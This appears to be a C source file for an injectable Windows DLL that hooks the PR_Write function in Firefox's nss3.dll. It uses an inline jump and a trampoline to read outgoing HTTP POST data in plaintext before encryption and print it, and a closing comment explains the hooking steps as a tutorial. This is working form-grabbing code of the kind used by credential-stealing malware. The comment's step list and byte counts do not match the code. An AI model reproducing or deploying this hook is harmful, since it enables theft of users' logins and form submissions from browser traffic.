#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>


typedef int (*PTRPR_Write)(SOCKET* fd, char * buf, int amount);

LPVOID TrempolineAddress = NULL;

int HPR_Write(SOCKET* fd, char * buf, int amount)
{


    if (strstr(buf, "POST"))
    {
        printf("%s \n", buf);
    }

    //printf("%s \n", buf);

    PTRPR_Write fTRPR_Write = (PTRPR_Write)TrempolineAddress;

    return fTRPR_Write(fd, buf, amount);
}



DWORD WINAPI InstallHook() 
{

    /// 1
    AllocConsole();
    freopen("CONOUT$", "w", stdout);

    MessageBoxA(NULL, NULL, NULL, NULL);
    /// 2
    byte    OriginalBytes[7];
    DWORD   ReadedBytes = 0;
    DWORD   BytesSize = 7;
    FARPROC  OriginalPrWriteAddress = GetProcAddress(GetModuleHandleA("nss3.dll"), "PR_Write");

    printf("Original PR_WRITE Function address at 0x%x ", OriginalPrWriteAddress);

    BOOL readbytes = ReadProcessMemory(GetCurrentProcess(), (LPVOID)OriginalPrWriteAddress, &OriginalBytes, BytesSize,&ReadedBytes);


    /// 3
    if (readbytes != FALSE && BytesSize == ReadedBytes)
    {
        byte JmpBytes[7];
        DWORD WrittenBytes = 0;
        DWORD dstFunction = (DWORD)&HPR_Write;

        DWORD Rva = dstFunction - ((DWORD)OriginalPrWriteAddress + 5);

        memcpy_s(JmpBytes, 1, "\xE9", 1);
        memcpy_s(JmpBytes + 1, 4, &Rva, 4);
        memcpy_s(JmpBytes + 5, 1, "\x90", 1);
        memcpy_s(JmpBytes + 6, 1, "\x90", 1);

       BOOL WriteJmp =  WriteProcessMemory(GetCurrentProcess(), (LPVOID)OriginalPrWriteAddress, JmpBytes, BytesSize, &WrittenBytes);


       /// 4
       if (WriteJmp != FALSE && BytesSize == WrittenBytes) 
       {

           TrempolineAddress = VirtualAllocEx(GetCurrentProcess(),NULL, 13, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
           if (TrempolineAddress == NULL) 
           {
               printf("Faild to allocate memory %d" ,GetLastError() );
               Sleep(5000);

           }
           DWORD TrempoRva = (DWORD)OriginalPrWriteAddress + 7;
         

           memcpy_s(TrempolineAddress, 7, OriginalBytes, 7);
           memcpy_s((byte*)TrempolineAddress + 7, 1, "\x68", 1);
           memcpy_s((byte*)TrempolineAddress + 8, 4, &TrempoRva, 4);
           memcpy_s((byte*)TrempolineAddress + 12, 1, "\xC3", 1);
            
       }


    }
    else
    {

        printf("Faild to read the bytes %d" ,GetLastError() );

    }








    MessageBoxA(NULL, NULL, NULL, NULL);


    return 0;
}







BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {

  

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)InstallHook, NULL, 0, 0);

        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}











/*
        A Success API Hooking need these 4 steps so make sure you read them carfully and don't skip any step to make sure this will work for you

        1 - Get original function address
        2 - Read the first 5 bytes from the original function
        3 - Calculate relative address and write jmp instruction to byte array and relative address
        4 - Create Trempoline function typedef
        5 - allocate memory for Trempoline function
        6 - copy the orignal 5 bytes , copy Push instruction and copy the rva then copy return instruction to trempoline function
        7 - Will done the Hook is done

*/
